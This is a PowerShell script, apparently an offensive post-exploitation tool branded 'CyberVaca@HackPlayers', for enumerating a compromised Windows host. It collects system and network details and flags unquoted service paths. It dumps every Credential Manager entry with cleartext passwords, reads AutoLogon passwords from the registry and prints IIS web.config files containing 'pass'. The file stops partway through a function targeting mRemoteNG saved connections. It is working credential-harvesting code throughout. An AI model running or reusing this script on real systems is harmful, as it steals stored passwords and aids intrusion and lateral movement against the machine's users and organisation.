
$banner = @"
     .-----.            .'``-.
    /      ,--          | .- ``-.
  ,'    ,-'   ``.     _.-'  ,-.``.)
 ;     /   ,=---``--+'     .- -. ``.
(   \    ,'   =,- ,'     ( o ) | /\
 :   :  /  =,-'  /        \-'  ;(o :
  \  |     '    ;  (       ``--'  \ ;
   \ |        = |  \``--+   --.    ``(
    ``+       =/ :   :   ``.    ``.    \
     '      =/   \   ``--. '-.   ``.   ``.
      \    =;     ``._    : ( ``-.  ``.   ``.
       \  = ;        ``._.'  ``-.-``-._\    ``-.
        \= '                   _.-'_)  (::::)
         ``+      -.           ``--7'  ``--``..'
          (        :    .'       ;
           \       |    |       /
            \      | _.-|  +---'
             ``--+   ``.  \   \
                /``.  '-.-\   ``--.
               /    /#### ``----.'
              (  ,-'############\
              \\/###############;
               \###############/
 l1c0rd3b3ll0t4 |--------------|     _.---------
                :::::::::::::::|_.-''
                 ::::::::::_.-''
       .-''..'---'-------''     CyberVaca@HackPlayers
"@



function Get-Info {

$sistema_operativo = (Get-ItemProperty "Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName + " Build " + (Get-ItemProperty "Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuild
$modelo_equipo = (Get-ItemProperty "registry::HKLM\HARDWARE\DESCRIPTION\System\BIOS").SystemProductName
$controlador_de_dominio = "$env:LOGONSERVER".replace("\\","")
$nombre_maquina = $env:COMPUTERNAME
$num_procesadores = ((Get-ItemProperty "registry::HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\*").Identifier).count
$procesador = (Get-ItemProperty "registry::HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0").ProcessorNameString
$dominio = $env:USERDNSDOMAIN
$network = Get-ItemProperty "registry::HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\*" | Select-Object IPAddress, SubnetMask, DefaultGateway,NameServer

$PC = New-Object psobject -Property @{ 
"Nombre" = $env:COMPUTERNAME
"Sistema Operativo" = $sistema_operativo
"Procesador" = $procesador
"Modelo" = $modelo_equipo
"Dominio" = $Dominio
"Num. Procesadores" = $num_procesadores
"Direccion IP" = $network.ipaddress[0]
"Mascara de SubRed" = $network.SubnetMask[0]
"Puerta de Enlace" = $network.DefaultGateway[0]
"Servidores DNS" = $network.nameserver[0].Replace(","," ")
"MAC" = ((getmac)[3].split(" ")[0]).replace("-",":")
"RAM" = (((systeminfo | Select-String "memo")[0]) | Out-String).split(":")[1].Replace(" ","").split("MB")[0] + " MB"
}
$pc
}
function Get-Discosduros {Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root}
function Get-ConfigRED {

Start-Job -ScriptBlock { 
Write-Host "`n[+] ==================================== Tabla ARP ===========================================`n"
arp -A
Write-Host "`n[+] ==================================== Conexiones Activas ===========================================`n"

$listening = netstat -ano | Select-String "LISTENING"| Out-String; $listening  } | Wait-Job | Receive-Job


}
function credman {
Param
(
	[Parameter(Mandatory=$false)][Switch] $AddCred,
	[Parameter(Mandatory=$false)][Switch] $DelCred,
	[Parameter(Mandatory=$false)][Switch] $GetCred,
	[Parameter(Mandatory=$false)][Switch] $ShoCred,
	[Parameter(Mandatory=$false)][Switch] $RunTests,
	[Parameter(Mandatory=$false)][ValidateLength(1,32767) <# CRED_MAX_GENERIC_TARGET_NAME_LENGTH #>][String] $Target, 
	[Parameter(Mandatory=$false)][ValidateLength(1,512) <# CRED_MAX_USERNAME_LENGTH #>][String] $User, 
	[Parameter(Mandatory=$false)][ValidateLength(1,512) <# CRED_MAX_CREDENTIAL_BLOB_SIZE #>][String] $Pass,
	[Parameter(Mandatory=$false)][ValidateLength(1,256) <# CRED_MAX_STRING_LENGTH #>][String] $Comment,
	[Parameter(Mandatory=$false)][Switch] $All,
	[Parameter(Mandatory=$false)][ValidateSet("GENERIC",
											  "DOMAIN_PASSWORD",
											  "DOMAIN_CERTIFICATE",
											  "DOMAIN_VISIBLE_PASSWORD",
											  "GENERIC_CERTIFICATE",
											  "DOMAIN_EXTENDED",
											  "MAXIMUM",
											  "MAXIMUM_EX")][String] $CredType = "GENERIC",
	[Parameter(Mandatory=$false)][ValidateSet("SESSION",
											  "LOCAL_MACHINE",
											  "ENTERPRISE")][String] $CredPersist = "ENTERPRISE"
)

#region Pinvoke
#region Inline C#
[String] $PsCredmanUtils = @"
using System;
using System.Runtime.InteropServices;

namespace PsUtils
{
    public class CredMan
    {
        #region Imports
        // DllImport derives from System.Runtime.InteropServices
        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredDeleteW", CharSet = CharSet.Unicode)]
        private static extern bool CredDeleteW([In] string target, [In] CRED_TYPE type, [In] int reservedFlag);

        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredEnumerateW", CharSet = CharSet.Unicode)]
        private static extern bool CredEnumerateW([In] string Filter, [In] int Flags, out int Count, out IntPtr CredentialPtr);

        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredFree")]
        private static extern void CredFree([In] IntPtr cred);

        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredReadW", CharSet = CharSet.Unicode)]
        private static extern bool CredReadW([In] string target, [In] CRED_TYPE type, [In] int reservedFlag, out IntPtr CredentialPtr);

        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredWriteW", CharSet = CharSet.Unicode)]
        private static extern bool CredWriteW([In] ref Credential userCredential, [In] UInt32 flags);
        #endregion

        #region Fields
        public enum CRED_FLAGS : uint
        {
            NONE = 0x0,
            PROMPT_NOW = 0x2,
            USERNAME_TARGET = 0x4
        }

        public enum CRED_ERRORS : uint
        {
            ERROR_SUCCESS = 0x0,
            ERROR_INVALID_PARAMETER = 0x80070057,
            ERROR_INVALID_FLAGS = 0x800703EC,
            ERROR_NOT_FOUND = 0x80070490,
            ERROR_NO_SUCH_LOGON_SESSION = 0x80070520,
            ERROR_BAD_USERNAME = 0x8007089A
        }

        public enum CRED_PERSIST : uint
        {
            SESSION = 1,
            LOCAL_MACHINE = 2,
            ENTERPRISE = 3
        }

        public enum CRED_TYPE : uint
        {
            GENERIC = 1,
            DOMAIN_PASSWORD = 2,
            DOMAIN_CERTIFICATE = 3,
            DOMAIN_VISIBLE_PASSWORD = 4,
            GENERIC_CERTIFICATE = 5,
            DOMAIN_EXTENDED = 6,
            MAXIMUM = 7,      // Maximum supported cred type
            MAXIMUM_EX = (MAXIMUM + 1000),  // Allow new applications to run on old OSes
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct Credential
        {
            public CRED_FLAGS Flags;
            public CRED_TYPE Type;
            public string TargetName;
            public string Comment;
            public DateTime LastWritten;
            public UInt32 CredentialBlobSize;
            public string CredentialBlob;
            public CRED_PERSIST Persist;
            public UInt32 AttributeCount;
            public IntPtr Attributes;
            public string TargetAlias;
            public string UserName;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct NativeCredential
        {
            public CRED_FLAGS Flags;
            public CRED_TYPE Type;
            public IntPtr TargetName;
            public IntPtr Comment;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
            public UInt32 CredentialBlobSize;
            public IntPtr CredentialBlob;
            public UInt32 Persist;
            public UInt32 AttributeCount;
            public IntPtr Attributes;
            public IntPtr TargetAlias;
            public IntPtr UserName;
        }
        #endregion

        #region Child Class
        private class CriticalCredentialHandle : Microsoft.Win32.SafeHandles.CriticalHandleZeroOrMinusOneIsInvalid
        {
            public CriticalCredentialHandle(IntPtr preexistingHandle)
            {
                SetHandle(preexistingHandle);
            }

            private Credential XlateNativeCred(IntPtr pCred)
            {
                NativeCredential ncred = (NativeCredential)Marshal.PtrToStructure(pCred, typeof(NativeCredential));
                Credential cred = new Credential();
                cred.Type = ncred.Type;
                cred.Flags = ncred.Flags;
                cred.Persist = (CRED_PERSIST)ncred.Persist;

                long LastWritten = ncred.LastWritten.dwHighDateTime;
                LastWritten = (LastWritten << 32) + ncred.LastWritten.dwLowDateTime;
                cred.LastWritten = DateTime.FromFileTime(LastWritten);

                cred.UserName = Marshal.PtrToStringUni(ncred.UserName);
                cred.TargetName = Marshal.PtrToStringUni(ncred.TargetName);
                cred.TargetAlias = Marshal.PtrToStringUni(ncred.TargetAlias);
                cred.Comment = Marshal.PtrToStringUni(ncred.Comment);
                cred.CredentialBlobSize = ncred.CredentialBlobSize;
                if (0 < ncred.CredentialBlobSize)
                {
                    cred.CredentialBlob = Marshal.PtrToStringUni(ncred.CredentialBlob, (int)ncred.CredentialBlobSize / 2);
                }
                return cred;
            }

            public Credential GetCredential()
            {
                if (IsInvalid)
                {
                    throw new InvalidOperationException("Invalid CriticalHandle!");
                }
                Credential cred = XlateNativeCred(handle);
                return cred;
            }

            public Credential[] GetCredentials(int count)
            {
                if (IsInvalid)
                {
                    throw new InvalidOperationException("Invalid CriticalHandle!");
                }
                Credential[] Credentials = new Credential[count];
                IntPtr pTemp = IntPtr.Zero;
                for (int inx = 0; inx < count; inx++)
                {
                    pTemp = Marshal.ReadIntPtr(handle, inx * IntPtr.Size);
                    Credential cred = XlateNativeCred(pTemp);
                    Credentials[inx] = cred;
                }
                return Credentials;
            }

            override protected bool ReleaseHandle()
            {
                if (IsInvalid)
                {
                    return false;
                }
                CredFree(handle);
                SetHandleAsInvalid();
                return true;
            }
        }
        #endregion

        #region Custom API
        public static int CredDelete(string target, CRED_TYPE type)
        {
            if (!CredDeleteW(target, type, 0))
            {
                return Marshal.GetHRForLastWin32Error();
            }
            return 0;
        }

        public static int CredEnum(string Filter, out Credential[] Credentials)
        {
            int count = 0;
            int Flags = 0x0;
            if (string.IsNullOrEmpty(Filter) ||
                "*" == Filter)
            {
                Filter = null;
                if (6 <= Environment.OSVersion.Version.Major)
                {
                    Flags = 0x1; //CRED_ENUMERATE_ALL_CREDENTIALS; only valid is OS >= Vista
                }
            }
            IntPtr pCredentials = IntPtr.Zero;
            if (!CredEnumerateW(Filter, Flags, out count, out pCredentials))
            {
                Credentials = null;
                return Marshal.GetHRForLastWin32Error(); 
            }
            CriticalCredentialHandle CredHandle = new CriticalCredentialHandle(pCredentials);
            Credentials = CredHandle.GetCredentials(count);
            return 0;
        }

        public static int CredRead(string target, CRED_TYPE type, out Credential Credential)
        {
            IntPtr pCredential = IntPtr.Zero;
            Credential = new Credential();
            if (!CredReadW(target, type, 0, out pCredential))
            {
                return Marshal.GetHRForLastWin32Error();
            }
            CriticalCredentialHandle CredHandle = new CriticalCredentialHandle(pCredential);
            Credential = CredHandle.GetCredential();
            return 0;
        }

        public static int CredWrite(Credential userCredential)
        {
            if (!CredWriteW(ref userCredential, 0))
            {
                return Marshal.GetHRForLastWin32Error();
            }
            return 0;
        }

        #endregion

        private static int AddCred()
        {
            Credential Cred = new Credential();
            string Password = "Password";
            Cred.Flags = 0;
            Cred.Type = CRED_TYPE.GENERIC;
            Cred.TargetName = "Target";
            Cred.UserName = "UserName";
            Cred.AttributeCount = 0;
            Cred.Persist = CRED_PERSIST.ENTERPRISE;
            Cred.CredentialBlobSize = (uint)Password.Length;
            Cred.CredentialBlob = Password;
            Cred.Comment = "Comment";
            return CredWrite(Cred);
        }

        private static bool CheckError(string TestName, CRED_ERRORS Rtn)
        {
            switch(Rtn)
            {
                case CRED_ERRORS.ERROR_SUCCESS:
                    Console.WriteLine(string.Format("'{0}' worked", TestName));
                    return true;
                case CRED_ERRORS.ERROR_INVALID_FLAGS:
                case CRED_ERRORS.ERROR_INVALID_PARAMETER:
                case CRED_ERRORS.ERROR_NO_SUCH_LOGON_SESSION:
                case CRED_ERRORS.ERROR_NOT_FOUND:
                case CRED_ERRORS.ERROR_BAD_USERNAME:
                    Console.WriteLine(string.Format("'{0}' failed; {1}.", TestName, Rtn));
                    break;
                default:
                    Console.WriteLine(string.Format("'{0}' failed; 0x{1}.", TestName, Rtn.ToString("X")));
                    break;
            }
            return false;
        }

        /*
         * Note: the Main() function is primarily for debugging and testing in a Visual 
         * Studio session.  Although it will work from PowerShell, it's not very useful.
         */
        public static void Main()
        {
            Credential[] Creds = null;
            Credential Cred = new Credential();
            int Rtn = 0;

            Console.WriteLine("Testing CredWrite()");
            Rtn = AddCred();
            if (!CheckError("CredWrite", (CRED_ERRORS)Rtn))
            {
                return;
            }
            Console.WriteLine("Testing CredEnum()");
            Rtn = CredEnum(null, out Creds);
            if (!CheckError("CredEnum", (CRED_ERRORS)Rtn))
            {
                return;
            }
            Console.WriteLine("Testing CredRead()");
            Rtn = CredRead("Target", CRED_TYPE.GENERIC, out Cred);
            if (!CheckError("CredRead", (CRED_ERRORS)Rtn))
            {
                return;
            }
            Console.WriteLine("Testing CredDelete()");
            Rtn = CredDelete("Target", CRED_TYPE.GENERIC);
            if (!CheckError("CredDelete", (CRED_ERRORS)Rtn))
            {
                return;
            }
            Console.WriteLine("Testing CredRead() again");
            Rtn = CredRead("Target", CRED_TYPE.GENERIC, out Cred);
            if (!CheckError("CredRead", (CRED_ERRORS)Rtn))
            {
                Console.WriteLine("if the error is 'ERROR_NOT_FOUND', this result is OK.");
            }
        }
    }
}
"@
#endregion

$PsCredMan = $null
try
{
	$PsCredMan = [PsUtils.CredMan]
}
catch
{
	#only remove the error we generate
	$Error.RemoveAt($Error.Count-1)
}
if($null -eq $PsCredMan)
{
	Add-Type $PsCredmanUtils
}
#endregion

#region Internal Tools
[HashTable] $ErrorCategory = @{0x80070057 = "InvalidArgument";
                               0x800703EC = "InvalidData";
                               0x80070490 = "ObjectNotFound";
                               0x80070520 = "SecurityError";
                               0x8007089A = "SecurityError"}

function Get-CredType
{
	Param
	(
		[Parameter(Mandatory=$true)][ValidateSet("GENERIC",
												  "DOMAIN_PASSWORD",
												  "DOMAIN_CERTIFICATE",
												  "DOMAIN_VISIBLE_PASSWORD",
												  "GENERIC_CERTIFICATE",
												  "DOMAIN_EXTENDED",
												  "MAXIMUM",
												  "MAXIMUM_EX")][String] $CredType
	)
	
	switch($CredType)
	{
		"GENERIC" {return [PsUtils.CredMan+CRED_TYPE]::GENERIC}
		"DOMAIN_PASSWORD" {return [PsUtils.CredMan+CRED_TYPE]::DOMAIN_PASSWORD}
		"DOMAIN_CERTIFICATE" {return [PsUtils.CredMan+CRED_TYPE]::DOMAIN_CERTIFICATE}
		"DOMAIN_VISIBLE_PASSWORD" {return [PsUtils.CredMan+CRED_TYPE]::DOMAIN_VISIBLE_PASSWORD}
		"GENERIC_CERTIFICATE" {return [PsUtils.CredMan+CRED_TYPE]::GENERIC_CERTIFICATE}
		"DOMAIN_EXTENDED" {return [PsUtils.CredMan+CRED_TYPE]::DOMAIN_EXTENDED}
		"MAXIMUM" {return [PsUtils.CredMan+CRED_TYPE]::MAXIMUM}
		"MAXIMUM_EX" {return [PsUtils.CredMan+CRED_TYPE]::MAXIMUM_EX}
	}
}

function Get-CredPersist
{
	Param
	(
		[Parameter(Mandatory=$true)][ValidateSet("SESSION",
												  "LOCAL_MACHINE",
												  "ENTERPRISE")][String] $CredPersist
	)
	
	switch($CredPersist)
	{
		"SESSION" {return [PsUtils.CredMan+CRED_PERSIST]::SESSION}
		"LOCAL_MACHINE" {return [PsUtils.CredMan+CRED_PERSIST]::LOCAL_MACHINE}
		"ENTERPRISE" {return [PsUtils.CredMan+CRED_PERSIST]::ENTERPRISE}
	}
}
#endregion

#region Dot-Sourced API
function Del-Creds
{
<#
.Synopsis
  Deletes the specified credentials

.Description
  Calls Win32 CredDeleteW via [PsUtils.CredMan]::CredDelete

.INPUTS
  See function-level notes

.OUTPUTS
  0 or non-0 according to action success
  [Management.Automation.ErrorRecord] if error encountered

.PARAMETER Target
  Specifies the URI for which the credentials are associated
  
.PARAMETER CredType
  Specifies the desired credentials type; defaults to 
  "CRED_TYPE_GENERIC"
#>

	Param
	(
		[Parameter(Mandatory=$true)][ValidateLength(1,32767)][String] $Target,
		[Parameter(Mandatory=$false)][ValidateSet("GENERIC",
												  "DOMAIN_PASSWORD",
												  "DOMAIN_CERTIFICATE",
												  "DOMAIN_VISIBLE_PASSWORD",
												  "GENERIC_CERTIFICATE",
												  "DOMAIN_EXTENDED",
												  "MAXIMUM",
												  "MAXIMUM_EX")][String] $CredType = "GENERIC"
	)
	
	[Int] $Results = 0
	try
	{
		$Results = [PsUtils.CredMan]::CredDelete($Target, $(Get-CredType $CredType))
	}
	catch
	{
		return $_
	}
	if(0 -ne $Results)
	{
		[String] $Msg = "Failed to delete credentials store for target '$Target'"
		[Management.ManagementException] $MgmtException = New-Object Management.ManagementException($Msg)
		[Management.Automation.ErrorRecord] $ErrRcd = New-Object Management.Automation.ErrorRecord($MgmtException, $Results.ToString("X"), $ErrorCategory[$Results], $null)
		return $ErrRcd
	}
	return $Results
}

function Enum-Creds
{
<#
.Synopsis
  Enumerates stored credentials for operating user

.Description
  Calls Win32 CredEnumerateW via [PsUtils.CredMan]::CredEnum

.INPUTS
  

.OUTPUTS
  [PsUtils.CredMan+Credential[]] if successful
  [Management.Automation.ErrorRecord] if unsuccessful or error encountered

.PARAMETER Filter
  Specifies the filter to be applied to the query
  Defaults to [String]::Empty
  
#>

	Param
	(
		[Parameter(Mandatory=$false)][AllowEmptyString()][String] $Filter = [String]::Empty
	)
	
	[PsUtils.CredMan+Credential[]] $Creds = [Array]::CreateInstance([PsUtils.CredMan+Credential], 0)
	[Int] $Results = 0
	try
	{
		$Results = [PsUtils.CredMan]::CredEnum($Filter, [Ref]$Creds)
	}
	catch
	{
		return $_
	}
	switch($Results)
	{
        0 {break}
        0x80070490 {break} #ERROR_NOT_FOUND
        default
        {
    		[String] $Msg = "Failed to enumerate credentials store for user '$Env:UserName'"
    		[Management.ManagementException] $MgmtException = New-Object Management.ManagementException($Msg)
    		[Management.Automation.ErrorRecord] $ErrRcd = New-Object Management.Automation.ErrorRecord($MgmtException, $Results.ToString("X"), $ErrorCategory[$Results], $null)
    		return $ErrRcd
        }
	}
	return $Creds
}

function Read-Creds
{
<#
.Synopsis
  Reads specified credentials for operating user

.Description
  Calls Win32 CredReadW via [PsUtils.CredMan]::CredRead

.INPUTS

.OUTPUTS
  [PsUtils.CredMan+Credential] if successful
  [Management.Automation.ErrorRecord] if unsuccessful or error encountered

.PARAMETER Target
  Specifies the URI for which the credentials are associated
  If not provided, the username is used as the target
  
.PARAMETER CredType
  Specifies the desired credentials type; defaults to 
  "CRED_TYPE_GENERIC"
#>

	Param
	(
		[Parameter(Mandatory=$true)][ValidateLength(1,32767)][String] $Target,
		[Parameter(Mandatory=$false)][ValidateSet("GENERIC",
												  "DOMAIN_PASSWORD",
												  "DOMAIN_CERTIFICATE",
												  "DOMAIN_VISIBLE_PASSWORD",
												  "GENERIC_CERTIFICATE",
												  "DOMAIN_EXTENDED",
												  "MAXIMUM",
												  "MAXIMUM_EX")][String] $CredType = "GENERIC"
	)
	
	if("GENERIC" -ne $CredType -and 337 -lt $Target.Length) #CRED_MAX_DOMAIN_TARGET_NAME_LENGTH
	{
		[String] $Msg = "Target field is longer ($($Target.Length)) than allowed (max 337 characters)"
		[Management.ManagementException] $MgmtException = New-Object Management.ManagementException($Msg)
		[Management.Automation.ErrorRecord] $ErrRcd = New-Object Management.Automation.ErrorRecord($MgmtException, 666, 'LimitsExceeded', $null)
		return $ErrRcd
	}
	[PsUtils.CredMan+Credential] $Cred = New-Object PsUtils.CredMan+Credential
    [Int] $Results = 0
	try
	{
		$Results = [PsUtils.CredMan]::CredRead($Target, $(Get-CredType $CredType), [Ref]$Cred)
	}
	catch
	{
		return $_
	}
	
	switch($Results)
	{
        0 {break}
        0x80070490 {return $null} #ERROR_NOT_FOUND
        default
        {
    		[String] $Msg = "Error reading credentials for target '$Target' from '$Env:UserName' credentials store"
    		[Management.ManagementException] $MgmtException = New-Object Management.ManagementException($Msg)
    		[Management.Automation.ErrorRecord] $ErrRcd = New-Object Management.Automation.ErrorRecord($MgmtException, $Results.ToString("X"), $ErrorCategory[$Results], $null)
    		return $ErrRcd
        }
	}
	return $Cred
}

function Write-Creds
{
<#
.Synopsis
  Saves or updates specified credentials for operating user

.Description
  Calls Win32 CredWriteW via [PsUtils.CredMan]::CredWrite

.INPUTS

.OUTPUTS
  [Boolean] true if successful
  [Management.Automation.ErrorRecord] if unsuccessful or error encountered

.PARAMETER Target
  Specifies the URI for which the credentials are associated
  If not provided, the username is used as the target
  
.PARAMETER UserName
  Specifies the name of credential to be read
  
.PARAMETER Password
  Specifies the password of credential to be read
  
.PARAMETER Comment
  Allows the caller to specify the comment associated with 
  these credentials
  
.PARAMETER CredType
  Specifies the desired credentials type; defaults to 
  "CRED_TYPE_GENERIC"

.PARAMETER CredPersist
  Specifies the desired credentials storage type;
  defaults to "CRED_PERSIST_ENTERPRISE"
#>

	Param
	(
		[Parameter(Mandatory=$false)][ValidateLength(0,32676)][String] $Target,
		[Parameter(Mandatory=$true)][ValidateLength(1,512)][String] $UserName,
		[Parameter(Mandatory=$true)][ValidateLength(1,512)][String] $Password,
		[Parameter(Mandatory=$false)][ValidateLength(0,256)][String] $Comment = [String]::Empty,
		[Parameter(Mandatory=$false)][ValidateSet("GENERIC",
												  "DOMAIN_PASSWORD",
												  "DOMAIN_CERTIFICATE",
												  "DOMAIN_VISIBLE_PASSWORD",
												  "GENERIC_CERTIFICATE",
												  "DOMAIN_EXTENDED",
												  "MAXIMUM",
												  "MAXIMUM_EX")][String] $CredType = "GENERIC",
		[Parameter(Mandatory=$false)][ValidateSet("SESSION",
												  "LOCAL_MACHINE",
												  "ENTERPRISE")][String] $CredPersist = "ENTERPRISE"
	)

	if([String]::IsNullOrEmpty($Target))
	{
		$Target = $UserName
	}
	if("GENERIC" -ne $CredType -and 337 -lt $Target.Length) #CRED_MAX_DOMAIN_TARGET_NAME_LENGTH
	{
		[String] $Msg = "Target field is longer ($($Target.Length)) than allowed (max 337 characters)"
		[Management.ManagementException] $MgmtException = New-Object Management.ManagementException($Msg)
		[Management.Automation.ErrorRecord] $ErrRcd = New-Object Management.Automation.ErrorRecord($MgmtException, 666, 'LimitsExceeded', $null)
		return $ErrRcd
	}
    if([String]::IsNullOrEmpty($Comment))
    {
        $Comment = [String]::Format("Last edited by {0}\{1} on {2}",
                                    $Env:UserDomain,
                                    $Env:UserName,
                                    $Env:ComputerName)
    }
	[String] $DomainName = [Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName
	[PsUtils.CredMan+Credential] $Cred = New-Object PsUtils.CredMan+Credential
	switch($Target -eq $UserName -and 
		   ("CRED_TYPE_DOMAIN_PASSWORD" -eq $CredType -or 
		    "CRED_TYPE_DOMAIN_CERTIFICATE" -eq $CredType))
	{
		$true  {$Cred.Flags = [PsUtils.CredMan+CRED_FLAGS]::USERNAME_TARGET}
		$false  {$Cred.Flags = [PsUtils.CredMan+CRED_FLAGS]::NONE}
	}
	$Cred.Type = Get-CredType $CredType
	$Cred.TargetName = $Target
	$Cred.UserName = $UserName
	$Cred.AttributeCount = 0
	$Cred.Persist = Get-CredPersist $CredPersist
	$Cred.CredentialBlobSize = [Text.Encoding]::Unicode.GetBytes($Password).Length
	$Cred.CredentialBlob = $Password
	$Cred.Comment = $Comment

	[Int] $Results = 0
	try
	{
		$Results = [PsUtils.CredMan]::CredWrite($Cred)
	}
	catch
	{
		return $_
	}

	if(0 -ne $Results)
	{
		[String] $Msg = "Failed to write to credentials store for target '$Target' using '$UserName', '$Password', '$Comment'"
		[Management.ManagementException] $MgmtException = New-Object Management.ManagementException($Msg)
		[Management.Automation.ErrorRecord] $ErrRcd = New-Object Management.Automation.ErrorRecord($MgmtException, $Results.ToString("X"), $ErrorCategory[$Results], $null)
		return $ErrRcd
	}
	return $Results
}

#endregion

#region Cmd-Line functionality
function CredManMain
{
#region Adding credentials
	if($AddCred)
	{
		if([String]::IsNullOrEmpty($User) -or
		   [String]::IsNullOrEmpty($Pass))
		{
			Write-Host "You must supply a user name and password (target URI is optional)."
			return
		}
		# may be [Int32] or [Management.Automation.ErrorRecord]
		[Object] $Results = Write-Creds $Target $User $Pass $Comment $CredType $CredPersist
		if(0 -eq $Results)
		{
			[Object] $Cred = Read-Creds $Target $CredType
			if($null -eq $Cred)
			{
				Write-Host "Credentials for '$Target', '$User' was not found."
				return
			}
			if($Cred -is [Management.Automation.ErrorRecord])
			{
				return $Cred
			}
			[String] $CredStr = @"
Successfully wrote or updated credentials as:
  UserName  : $($Cred.UserName)
  Password  : $($Cred.CredentialBlob)
  Target    : $($Cred.TargetName.Substring($Cred.TargetName.IndexOf("=")+1))
  Updated   : $([String]::Format("{0:yyyy-MM-dd HH:mm:ss}", $Cred.LastWritten.ToUniversalTime())) UTC
  Comment   : $($Cred.Comment)
"@
			Write-Host $CredStr

			return
		}
		# will be a [Management.Automation.ErrorRecord]
		return $Results
	}
#endregion	

#region Removing credentials
	if($DelCred)
	{
		if(-not $Target)
		{
			Write-Host "You must supply a target URI."
			return
		}
		# may be [Int32] or [Management.Automation.ErrorRecord]
		[Object] $Results = Del-Creds $Target $CredType 
		if(0 -eq $Results)
		{
			Write-Host "Successfully deleted credentials for '$Target'"
			return
		}
		# will be a [Management.Automation.ErrorRecord]
		return $Results
	}
#endregion

#region Reading selected credential
	if($GetCred)
	{
		if(-not $Target)
		{
			Write-Host "You must supply a target URI."
			return
		}
		# may be [PsUtils.CredMan+Credential] or [Management.Automation.ErrorRecord]
		[Object] $Cred = Read-Creds $Target $CredType
		if($null -eq $Cred)
		{
			Write-Host "Credential for '$Target' as '$CredType' type was not found."
			return
		}
		if($Cred -is [Management.Automation.ErrorRecord])
		{
			return $Cred
		}
		[String] $CredStr = @"
Found credentials as:
  UserName  : $($Cred.UserName)
  Password  : $($Cred.CredentialBlob)
  Target    : $($Cred.TargetName.Substring($Cred.TargetName.IndexOf("=")+1))
  Updated   : $([String]::Format("{0:yyyy-MM-dd HH:mm:ss}", $Cred.LastWritten.ToUniversalTime())) UTC
  Comment   : $($Cred.Comment)
"@
		Write-Host $CredStr
	}
#endregion

#region Reading all credentials
	if($ShoCred)
	{
		# may be [PsUtils.CredMan+Credential[]] or [Management.Automation.ErrorRecord]
		[Object] $Creds = Enum-Creds
		if($Creds -split [Array] -and 0 -eq $Creds.Length)
		{
			Write-Host "No Credentials found for $($Env:UserName)"
			return
		}
		if($Creds -is [Management.Automation.ErrorRecord])
		{
			return $Creds
		}
		foreach($Cred in $Creds)
		{
			[String] $CredStr = @"
			
UserName  : $($Cred.UserName)
Password  : $($Cred.CredentialBlob)
Target    : $($Cred.TargetName.Substring($Cred.TargetName.IndexOf("=")+1))
Updated   : $([String]::Format("{0:yyyy-MM-dd HH:mm:ss}", $Cred.LastWritten.ToUniversalTime())) UTC
Comment   : $($Cred.Comment)
"@


			if($All)
			{
				$CredStr = @"
$CredStr
Alias     : $($Cred.TargetAlias)
AttribCnt : $($Cred.AttributeCount)
Attribs   : $($Cred.Attributes)
Flags     : $($Cred.Flags)
Pwd Size  : $($Cred.CredentialBlobSize)
Storage   : $($Cred.Persist)
Type      : $($Cred.Type)
"@


			}


$Credenciales_extraidas = New-Object psobject -Property @{ 
"Username" = $Cred.UserName
"Password" = $Cred.CredentialBlob
"Target" = $Cred.TargetName.Substring($Cred.TargetName.IndexOf("=")+1)
"Updated" = ([String]::Format("{0:yyyy-MM-dd HH:mm:ss}", $Cred.LastWritten.ToUniversalTime())) 
"Comment" = $Cred.Comment
}
            if (($Credenciales_extraidas.password).length -lt 30 -and ($Credenciales_extraidas.password).length -gt "3") {$Credenciales_extraidas} else {}            

		}
		return
	}
#endregion

#region Run basic diagnostics
	if($RunTests)
	{
		[PsUtils.CredMan]::Main()
	}
#endregion
}
#endregion

CredManMain
}
function Get-Config-Firewall {
Write-Host "`n[+] ================================== Configuracion de Firewall  ==================================`n"
netsh firewall show all 

}
$tareas = schtasks /query /fo LIST /v
function Get-DriversInstalados { Get-WmiObject Win32_PnPSignedDriver| Where-Object {$_.DriverProviderName -notlike "Microsoft" -and $_.devicename -ne $null} | select devicename, driverversion}
function Obtenemos-Servicios {
Start-Job -ScriptBlock { Get-ItemProperty  "registry::HKLM\SYSTEM\CurrentControlSet\services\*" |  Where-Object {$_.imagePath -notlike "*system32*" -and $_.imagepath -ne $null -and $_.imagepath -notlike '*"*' } |Select-Object  PSChildName,ImagePath  | Format-Table} | Wait-Job | Receive-Job
}
function get-autologon {
$resultado = Get-ItemProperty "registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" | Select-Object AutoAdminLogon, DefaultUserName, DefaultPassword, DefaultDomainName

if (($resultado.DefaultPassword).count -ge "1") {Write-Host "`n[+] ================================== Encontradas Credenciales en AutoLogon  ==================================`n";$resultado} else {Write-Host "`n[+] ================================== No se han encontrado datos en AutoLogon  ==================================`n"}


}
function buscarCadena([String]$cadena , [String]$file) {
    if ((Test-Path -Path $file) -and $cadena) {
        $list = Get-Content $file
        if ($list -match $cadena) {
            return $true
        }
    }
    return $false
}
function Get-Webconfig {
[array]$webconfigs = (ls c:\inetpub -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {$_.FullName -like "*web.config"}  | Select-Object fullname).fullname
foreach ($webconfig in $webconfigs) {
if ((buscarCadena -cadena "pass" -file $webconfig) -eq $true) {
$ErrorActionPreference = "SilentlyContinue"
Write-Host "`n[+] ================================== Posible Password  ==================================`n"
Write-Host "[+] Archivo : $webconfig `n"
Write-Host "[+] Contenido : `n"
gc $webconfig

}

} }
function Get-Mremote {

[array]$full_user = (ls c:\users\ | Select-Object fullname).fullname
foreach ($usuario in $full_user) {
if ( (test-path "$usuario\appdata\Roaming\mRemoteNG") -eq $true ) {
